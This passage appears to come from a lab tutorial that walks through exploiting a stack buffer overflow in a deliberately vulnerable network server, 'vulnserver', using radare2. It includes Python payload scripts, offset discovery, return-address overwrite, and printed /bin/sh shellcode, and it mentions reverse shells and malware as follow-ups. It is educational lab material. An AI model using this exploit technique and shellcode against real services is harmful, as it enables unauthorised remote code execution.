+<p>As it randomizes memory addresses to avoid attackers hardcode addresses to memory positions such as relevant function calls etc <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">Read about ASLR</a> We’ll be hardcoding stuff in here so consider it.</p>
+
+<p>Let’s get to it then. After compiling the program we can run it in radare2 debug mode with</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>radare2 -dAAA vulnserver 8081
+</code></pre></div></div>
+<p>Then as usual we can inspect the functions:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x000009b0]&gt; afl
+0x00000000    2 64           sym.imp.__libc_start_main
+0x00000878    3 23           sym._init
+0x000008a0    1 6            sym.imp.recv
+0x000008b0    1 6            sym.imp.strcpy
+0x000008c0    1 6            sym.imp.puts
+0x000008d0    1 6            sym.imp.strlen
+0x000008e0    1 6            sym.imp.htons
+0x000008f0    1 6            sym.imp.send
+0x00000900    1 6            sym.imp.printf
+0x00000910    1 6            sym.imp.close
+0x00000920    1 6            sym.imp.strcmp
+0x00000930    1 6            sym.imp.fflush
+0x00000940    1 6            sym.imp.listen
+0x00000950    1 6            sym.imp.bind
+0x00000960    1 6            sym.imp.accept
+0x00000970    1 6            sym.imp.atoi
+0x00000980    1 6            sym.imp.exit
+0x00000990    1 6            sym.imp.socket
+0x000009a0    1 6            sub.__cxa_finalize_248_9a0
+0x000009b0    1 43           entry0
+0x000009e0    4 50   -&gt; 40   sym.deregister_tm_clones
+0x00000a20    4 66   -&gt; 57   sym.register_tm_clones
+0x00000a70    4 49           sym.__do_global_dtors_aux
+0x00000ab0    1 10           entry1.init
+0x00000aba    1 59           sym.egg
+0x00000af5    3 73           sym.checkAuth
+0x00000b3e   11 395          sym.handleConnection
+0x00000cc9    8 221          sym.start
+0x00000da6    4 88           main
+0x00000e00    4 101          sym.__libc_csu_init
+0x00000e70    1 2            sym.__libc_csu_fini
+0x00000e74    1 9            sym._fini
+[0x000009b0]&gt; 
+</code></pre></div></div>
+<p>And jump to main to start seeing what it does:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x000009b0]&gt; s 0x00000da6
+[0x00000da6]&gt; pdf
+            ;-- main:
+/ (fcn) main 88
+|   main ();
+|           ; var int local_10h @ rbp-0x10
+|           ; var int local_4h @ rbp-0x4
+|              ; DATA XREF from 0x000009cd (entry0)
+|           0x00000da6      55             push rbp                    ; vulns.c:209 int main(int argc, char* argv[]) {
+|           0x00000da7      4889e5         mov rbp, rsp
+|           0x00000daa      4883ec10       sub rsp, 0x10
+|           0x00000dae      897dfc         mov dword [local_4h], edi
+|           0x00000db1      488975f0       mov qword [local_10h], rsi
+|           0x00000db5      837dfc02       cmp dword [local_4h], 2     ; vulns.c:210   if (argc != 2) { ; [0x2:4]=0x102464c
+|       ,=&lt; 0x00000db9      7422           je 0xddd
+|       |   0x00000dbb      488b45f0       mov rax, qword [local_10h]  ; vulns.c:211     printf("Usage: %s PORT \n", argv[0]);
+|       |   0x00000dbf      488b00         mov rax, qword [rax]
+|       |   0x00000dc2      4889c6         mov rsi, rax
+|       |   0x00000dc5      488d3de20500.  lea rdi, qword str.Usage:__s_PORT ; 0x13ae ; "Usage: %s PORT \n" ; const char * format
+|       |   0x00000dcc      b800000000     mov eax, 0
+|       |   0x00000dd1      e82afbffff     call sym.imp.printf         ; int printf(const char *format)
+|       |   0x00000dd6      b800000000     mov eax, 0                  ; vulns.c:212     return 0;
+|      ,==&lt; 0x00000ddb      eb1f           jmp 0xdfc
+|      ||      ; JMP XREF from 0x00000db9 (main)
+|      |`-&gt; 0x00000ddd      488b45f0       mov rax, qword [local_10h]  ; vulns.c:215   start(atoi(argv[1]));
+|      |    0x00000de1      4883c008       add rax, 8
+|      |    0x00000de5      488b00         mov rax, qword [rax]
+|      |    0x00000de8      4889c7         mov rdi, rax                ; const char * str
+|      |    0x00000deb      e880fbffff     call sym.imp.atoi           ; int atoi(const char *str)
+|      |    0x00000df0      89c7           mov edi, eax
+|      |    0x00000df2      e8d2feffff     call sym.start
+|      |    0x00000df7      b800000000     mov eax, 0                  ; vulns.c:217   return 0;
+|      |       ; JMP XREF from 0x00000ddb (main)
+|      `--&gt; 0x00000dfc      c9             leave                       ; vulns.c:218 }
+\           0x00000dfd      c3             ret
+[0x00000da6]&gt; 
+</code></pre></div></div>
+<p>And we will quickly see that the main is basically used for the program initialization, params loading and such and to quickly jump to “start()”, so we move there:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00000da6]&gt; s 0x00000cc9
+[0x00000cc9]&gt; pdf
+/ (fcn) sym.start 221
+|   sym.start ();
+|           ; var int local_24h @ rbp-0x24
+|           ; var int local_20h @ rbp-0x20
+|           ; var int local_1eh @ rbp-0x1e
+|           ; var int local_1ch @ rbp-0x1c
+|           ; var int local_4h @ rbp-0x4
+|              ; CALL XREF from 0x00000df2 (main)
+|           0x00000cc9      55             push rbp                    ; vulns.c:170 void start(int port) {
+|           0x00000cca      4889e5         mov rbp, rsp
+|           0x00000ccd      4883ec30       sub rsp, 0x30               ; '0'
+|           0x00000cd1      897ddc         mov dword [local_24h], edi
+|           0x00000cd4      ba06000000     mov edx, 6                  ; vulns.c:174   sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+|           0x00000cd9      be01000000     mov esi, 1
+|           0x00000cde      bf02000000     mov edi, 2
+|           0x00000ce3      e8a8fcffff     call sym.imp.socket
+|           0x00000ce8      8945fc         mov dword [local_4h], eax
+|           0x00000ceb      837dfc00       cmp dword [local_4h], 0     ; vulns.c:175   if (sock &lt; 0) {
+|       ,=&lt; 0x00000cef      7916           jns 0xd07
+|       |   0x00000cf1      488d3d610600.  lea rdi, qword str.Error_opening_socket ; vulns.c:176     printf("Error opening socket\n"); ; 0x1359 ; "Error opening socket" ; const char * s
+|       |   0x00000cf8      e8c3fbffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x00000cfd      bfffffffff     mov edi, 0xffffffff         ; vulns.c:177     exit(-1); ; -1 ; int status
+|       |   0x00000d02      e879fcffff     call sym.imp.exit           ; void exit(int status)
+|       |      ; JMP XREF from 0x00000cef (sym.start)
+|       `-&gt; 0x00000d07      8b45dc         mov eax, dword [local_24h]  ; vulns.c:180   server.sin_port = htons(port);
+|           0x00000d0a      0fb7c0         movzx eax, ax
+|           0x00000d0d      89c7           mov edi, eax
+|           0x00000d0f      e8ccfbffff     call sym.imp.htons
+|           0x00000d14      668945e2       mov word [local_1eh], ax
+|           0x00000d18      c745e4000000.  mov dword [local_1ch], 0    ; vulns.c:181   server.sin_addr.s_addr = INADDR_ANY;
+|           0x00000d1f      66c745e00200   mov word [local_20h], 2     ; vulns.c:182   server.sin_family = AF_INET;
+|           0x00000d25      488d4de0       lea rcx, qword [local_20h]  ; vulns.c:184   if (bind(sock, (struct sockaddr*) &amp;server, sizeof(server)) &lt; 0) {
+|           0x00000d29      8b45fc         mov eax, dword [local_4h]
+|           0x00000d2c      ba10000000     mov edx, 0x10               ; rdx
+|           0x00000d31      4889ce         mov rsi, rcx
+|           0x00000d34      89c7           mov edi, eax
+|           0x00000d36      e815fcffff     call sym.imp.bind
+|           0x00000d3b      85c0           test eax, eax
+|       ,=&lt; 0x00000d3d      7916           jns 0xd55
+|       |   0x00000d3f      488d3d280600.  lea rdi, qword str.Error_binding_socket ; vulns.c:185     printf("Error binding socket\n"); ; 0x136e ; "Error binding socket" ; const char * s
+|       |   0x00000d46      e875fbffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x00000d4b      bfffffffff     mov edi, 0xffffffff         ; vulns.c:186     exit(-1); ; -1 ; int status
+|       |   0x00000d50      e82bfcffff     call sym.imp.exit           ; void exit(int status)
+|       |      ; JMP XREF from 0x00000d3d (sym.start)
+|       `-&gt; 0x00000d55      8b45fc         mov eax, dword [local_4h]   ; vulns.c:189   if (listen(sock, 5) == -1) {
+|           0x00000d58      be05000000     mov esi, 5
+|           0x00000d5d      89c7           mov edi, eax
+|           0x00000d5f      e8dcfbffff     call sym.imp.listen
+|           0x00000d64      83f8ff         cmp eax, 0xff
+|       ,=&lt; 0x00000d67      7516           jne 0xd7f
+|       |   0x00000d69      488d3d130600.  lea rdi, qword str.Error_listening ; vulns.c:190     printf("Error listening\n"); ; 0x1383 ; "Error listening" ; const char * s
+|       |   0x00000d70      e84bfbffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x00000d75      bfffffffff     mov edi, 0xffffffff         ; vulns.c:191     exit(-1); ; -1 ; int status
+|       |   0x00000d7a      e801fcffff     call sym.imp.exit           ; void exit(int status)
+|       |      ; JMP XREF from 0x00000d67 (sym.start)
+|       `-&gt; 0x00000d7f      488d3d0d0600.  lea rdi, qword str.Waiting_for_connections... ; vulns.c:194   printf("Waiting for connections...\n"); ; 0x1393 ; "Waiting for connections..." ; const char * s
+|           0x00000d86      e835fbffff     call sym.imp.puts           ; int puts(const char *s)
+|              ; JMP XREF from 0x00000da4 (sym.start)
+|       .-&gt; 0x00000d8b      488b057e1220.  mov rax, qword [obj.stdout] ; vulns.c:197     fflush(stdout); ; loc.stdout ; [0x202010:8]=0
+|       :   0x00000d92      4889c7         mov rdi, rax                ; FILE *stream
+|       :   0x00000d95      e896fbffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|       :   0x00000d9a      8b45fc         mov eax, dword [local_4h]   ; vulns.c:198     handleConnection(sock);
+|       :   0x00000d9d      89c7           mov edi, eax
+|       :   0x00000d9f      e89afdffff     call sym.handleConnection
+\       `=&lt; 0x00000da4      ebe5           jmp 0xd8b                   ; vulns.c:197     fflush(stdout);
+[0x00000cc9]&gt; 
+</code></pre></div></div>
+<p>Then in start, a seasoned exploiter will quickly jump and identify the “recv” function as something potentially dangerous:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:135   recv_size = recv(fd, secret_buffer, 1024, 0);
+|           0x00000bcd      8b45fc         mov eax, dword [local_4h]
+|           0x00000bd0      b900000000     mov ecx, 0
+|           0x00000bd5      ba00040000     mov edx, 0x400
+|           0x00000bda      89c7           mov edi, eax
+|           0x00000bdc      e8bffcffff     call sym.imp.recv
+|           0x00000be1      8945ec         mov dword [local_14h], eax
+|           0x00000be4      837dec00       cmp dword [local_14h], 0    ; vulns.c:137   if (recv_size &lt;= 0) {
+|       ,=&lt; 0x00000be8      7f1b           jg 0xc05
+|       |   0x00000bea      488d3d270700.  lea rdi, qword str.Connection_close ; vulns.c:138     printf("Connection close!\n"); ; 0x1318 ; "Connection
+</code></pre></div></div>
+<p>At this point, the normal thing is to start paying attention to functions that actually receive data “from the outside” and place it somewhere on memory. One of the main problems in here can be an actual buffer overflow. How to identify it? We can debug the program while sending a big chunk of information (example: &gt;1000bytes) and see where and how it gets placed in memory. We can also quickly inspect the stack and start to think about the space we have and how our buffer won’t fit in there:</p>
+
+<p>So we set some breakpoints in here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>db 0x555555554b3e
+db 0x555555554c5a
+
+s 0x555555554b3e
+</code></pre></div></div>
+<p>And then we can use some simple python script to send that buffer, like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
+import sys
+
+payload = b"\x41"*1000  
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect = s.connect(('127.0.0.1',8081))
+s.send(payload)
+
+s.close()
+</code></pre></div></div>
+<p>We start the program and allow the execution with “dc”</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x555555554b3e]&gt; dc
+Waiting for connections...
+hit breakpoint at: 555555554b3e
+[0x555555554b3e]&gt; dc
+Got connection!
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
+[0x555555554b3d]&gt; 
+</code></pre></div></div>
+<p>And after the buffer gets sent by recv we see how the program crashes. After a program crash we need to start focusing on two things mainly, especially in situations like this one. The state of the registers and the Stack. We’ll need to see what registers we can control and if/what space in memory do we have to place shellcode in it:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x555555554b3d]&gt; dr
+rax = 0x41414141
+rbx = 0x00000000
+rcx = 0x7ffff7a985d0
+rdx = 0x00000059
+r8 = 0x00000000
+r9 = 0x00000000
+r10 = 0x00000000
+r11 = 0x7ffff7b912c0
+r12 = 0x5555555549b0
+r13 = 0x7fffffffe0b0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x5555555552a0
+rdi = 0x7fffffffdae0
+rsp = 0x7fffffffdb18
+rbp = 0x4141414141414141
+rip = 0x555555554b3d
+rflags = 0x00010286
+orax = 0xffffffffffffffff
+[0x555555554b3d]&gt; 
+</code></pre></div></div>
+<p>So we inspect the registers and the stack and we see that we can control a decent amount of space as well as we have full control of RBP, nice!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x555555554b3d]&gt; dr rbp
+0x4141414141414141
+[0x555555554b3d]&gt; 
+
+[0x555555554b3d]&gt; pxw @ rsp-100
+0x7fffffffdab4  0x00007fff 0x00000000 0x00000000 0x00000000  ................
+0x7fffffffdac4  0x00000000 0x55554b2e 0x00005555 0x0000000f  .....KUUUU......
+0x7fffffffdad4  0x00000000 0xffffdb30 0x00007fff 0x41414141  ....0.......AAAA
+0x7fffffffdae4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdaf4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb04  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb14  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb24  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb34  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb44  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb54  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb64  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb74  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb84  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb94  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdba4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+[0x555555554b3d]&gt; 
+</code></pre></div></div>
+<p>So right now two things can be done, the first one, to identify a space in memory to place our shellcode, the second one to identify the position in which we override our registers, being RBP one of interest.</p>
+
+<p>We can use some tool like <a href="https://github.com/Svenito/exploit-pattern">The pattern generator script</a> to generate a pattern of chars to send as “fuzzing”, then we can use the same script to identify the positions in which we overwrite memory:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 1000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+</code></pre></div></div>
+<p>So we generate and launch the pattern:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lab@lab-VirtualBox:~/exploit-pattern$ nc localhost 8081
+Welcome! Please enter the secret text:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+</code></pre></div></div>
+<p>And then we inspect the registers again:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x555555554b3d]&gt; dr
+rax = 0x35624134
+rbx = 0x00000000
+rcx = 0x4232684231684230
+rdx = 0x00000059
+r8 = 0x00000000
+r9 = 0x00000000
+r10 = 0x00000000
+r11 = 0x7ffff7b912c0
+r12 = 0x5555555549b0
+r13 = 0x7fffffffe0b0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x5555555552a0
+rdi = 0x7fffffffdae0
+rsp = 0x7fffffffdb18
+rbp = 0x6241376241366241
+rip = 0x555555554b3d
+rflags = 0x00010286
+orax = 0xffffffffffffffff
+
+[0x555555554b3d]&gt; pxw 300 @ rsp 
+0x7fffffffdb18  0x39624138 0x41306341 0x63413163 0x33634132  8Ab9Ac0Ac1Ac2Ac3
+0x7fffffffdb28  0x41346341 0x63413563 0x37634136 0x41386341  Ac4Ac5Ac6Ac7Ac8A
+0x7fffffffdb38  0x64413963 0x31644130 0x41326441 0x64413364  c9Ad0Ad1Ad2Ad3Ad
+0x7fffffffdb48  0x35644134 0x41366441 0x64413764 0x39644138  4Ad5Ad6Ad7Ad8Ad9
+0x7fffffffdb58  0x41306541 0x65413165 0x33654132 0x41346541  Ae0Ae1Ae2Ae3Ae4A
+0x7fffffffdb68  0x65413565 0x37654136 0x41386541 0x66413965  e5Ae6Ae7Ae8Ae9Af
+0x7fffffffdb78  0x31664130 0x41326641 0x66413366 0x35664134  0Af1Af2Af3Af4Af5
+0x7fffffffdb88  0x41366641 0x66413766 0x39664138 0x41306741  Af6Af7Af8Af9Ag0A
+0x7fffffffdb98  0x67413167 0x33674132 0x41346741 0x67413567  g1Ag2Ag3Ag4Ag5Ag
+0x7fffffffdba8  0x37674136 0x41386741 0x68413967 0x31684130  6Ag7Ag8Ag9Ah0Ah1
+0x7fffffffdbb8  0x41326841 0x68413368 0x35684134 0x41366841  Ah2Ah3Ah4Ah5Ah6A
+0x7fffffffdbc8  0x68413768 0x39684138 0x41306941 0x69413169  h7Ah8Ah9Ai0Ai1Ai
+0x7fffffffdbd8  0x33694132 0x41346941 0x69413569 0x37694136  2Ai3Ai4Ai5Ai6Ai7
+0x7fffffffdbe8  0x41386941 0x6a413969 0x316a4130 0x41326a41  Ai8Ai9Aj0Aj1Aj2A
+0x7fffffffdbf8  0x6a41336a 0x356a4134 0x41366a41 0x6a41376a  j3Aj4Aj5Aj6Aj7Aj
+0x7fffffffdc08  0x396a4138 0x41306b41 0x6b41316b 0x336b4132  8Aj9Ak0Ak1Ak2Ak3
+0x7fffffffdc18  0x41346b41 0x6b41356b 0x376b4136 0x41386b41  Ak4Ak5Ak6Ak7Ak8A
+0x7fffffffdc28  0x6c41396b 0x316c4130 0x41326c41 0x6c41336c  k9Al0Al1Al2Al3Al
+0x7fffffffdc38  0x356c4134 0x41366c41 0x6c41376c             4Al5Al6Al7Al
+</code></pre></div></div>
+<p>And we use the same tool, by copying and pasting those hex values:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x37674136
+Pattern 0x37674136 first occurrence at position 200 in pattern.
+
+lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x6241376241366241
+Pattern 0x6241376241366241 first occurrence at position 48 in pattern.
+</code></pre></div></div>
+<p>And now, as we know the positions of our payload where we overwrite specific values, we can try to land some marks in there to make sure we do have full control on them:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from struct import pack
+import socket
+import sys
+
+rip = 0x7fffffffdba8
+
+payload = b"\x41"*48 + b"\x90"*8 + b"B"*8 + b"\x90"*170 + b"\xCC"*200 +b"\x90"*800 
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect = s.connect(('127.0.0.1',8081))
+s.send(payload)
+
+s.close()
+</code></pre></div></div>
+<p>We launch the script again, check the registers and:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x555555554b3d]&gt; dr
+rax = 0x41414141
+rbx = 0x00000000
+rcx = 0x7ffff7a98650
+rdx = 0x00000059
+r8 = 0x00000000
+r9 = 0x00000000
+r10 = 0x00000000
+r11 = 0x7ffff7b912c0
+r12 = 0x5555555549b0
+r13 = 0x7fffffffe0b0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x5555555552a0
+rdi = 0x7fffffffdae0
+rsp = 0x7fffffffdb18
+rbp = 0x9090909090909090
+rip = 0x555555554b3d
+rflags = 0x00010286
+orax = 0xffffffffffffffff
+[0x555555554b3d]&gt; pxw @ rsp
+0x7fffffffdb18  0x42424242 0x42424242 0x90909090 0x90909090  BBBBBBBB........
+0x7fffffffdb28  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb38  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb48  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb58  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb68  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb78  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb88  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb98  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdba8  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdbb8  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdbc8  0xcccc9090 0xcccccccc 0xcccccccc 0xcccccccc  ................
+0x7fffffffdbd8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
+0x7fffffffdbe8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
+0x7fffffffdbf8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
+</code></pre></div></div>
+<p>Awesome, we control the stack, RBP and we have room for our shellcode.</p>
+
+<p>So from now, we have it clear that, for example a nice place to start landing shellcode in memory will be the position: 0x7fffffffdba8 why? because we can start writing there, it can be 2 bytes after or before in our case, we select that because it makes a nice 200 padding thats all.</p>
+
+<p>So we will want the RIP register to point 0x7fffffffdba8 after the crash. How to do it? As we have control over RBP, we know that the 64 bits after the stack frame contain the return value, when the function returns, the return value is popped into RIP, so the program can resume execution of the calling function. We know that the value of the “saved frame/base pointer” will be overwritten past the first 48 bytes, the “saved return address” goes right after so 48+8 bytes and then we overwritte the “saved return address” that will go into RIP, so we write the address of our shellcode in there:</p>
+
+<p>Also remember, that when you send a buffer/chunk that needs to be interpreted as a memory address, you need to check for the endianness, Little Endian in this case. <a href="https://embetronicx.com/tutorials/p_language/c/little-endian-and-big-endian/">Read about it</a></p>
+
+<p>Se we’ll send a buffer, for the overfflow, then the RIP address then some nops and \xCC (opcode for breakpoint, so we can pause the program and see if it’s working)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rip = 0x7fffffffdba8
+
+payload = b"\x41"*48 + b"\x90"*8 + pack("&lt;Q", rip) + b"\x90"*170 + b"\xCC"*200 +b"\x90"*800 
+</code></pre></div></div>
+<p>We send that and:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x7ffff7dd4090]&gt; dc
+Waiting for connections...
+Got connection!
+[0x7fffffffdc1b]&gt; 
+
+[0x7fffffffdc1b]&gt; pd 10
+            ;-- rip:
+            0x7fffffffdc1b      cc             int3
+            0x7fffffffdc1c      cc             int3
+            0x7fffffffdc1d      cc             int3
+            0x7fffffffdc1e      cc             int3
+            0x7fffffffdc1f      cc             int3
+            0x7fffffffdc20      cc             int3
+            0x7fffffffdc21      cc             int3
+            0x7fffffffdc22      cc             int3
+            0x7fffffffdc23      cc             int3
+            0x7fffffffdc24      cc             int3
+[0x7fffffffdc1b]&gt; 
+</code></pre></div></div>
+<p>RIP gets overwritten and we jump right into our shellcode. Right now it is all breakpoints, so nothing gets executed though we now have full control of the execution.</p>
+
+<p>At this point you’ll usually want to run shellcode, something useful, run some program, install malware, run a reverse shell etc. Sites like exploit-db, packetstormsecurity or a bunch of github sites do contain shellcode you can read and integrate. Here I’ll start by using a simple /bin/sh shellcode:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000000000400080 &lt;_start&gt;:
+  400080:	50                   	push   %rax
+  400081:	48 31 d2             	xor    %rdx,%rdx
+  400084:	48 31 f6             	xor    %rsi,%rsi
+  400087:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
+  40008e:	2f 73 68 
+  400091:	53                   	push   %rbx
+  400092:	54                   	push   %rsp
+  400093:	5f                   	pop    %rdi
+  400094:	b0 3b                	mov    $0x3b,%al
+  400096:	0f 05                	syscall
+
+\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+</code></pre></div></div>
+<p>We can basically copy and paste the hex, after understanding it:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x7fffffffdc13]&gt; ds
+[0x7fffffffdc13]&gt; pd 10
+            0x7fffffffdc13      cc             int3
+            0x7fffffffdc14      cc             int3
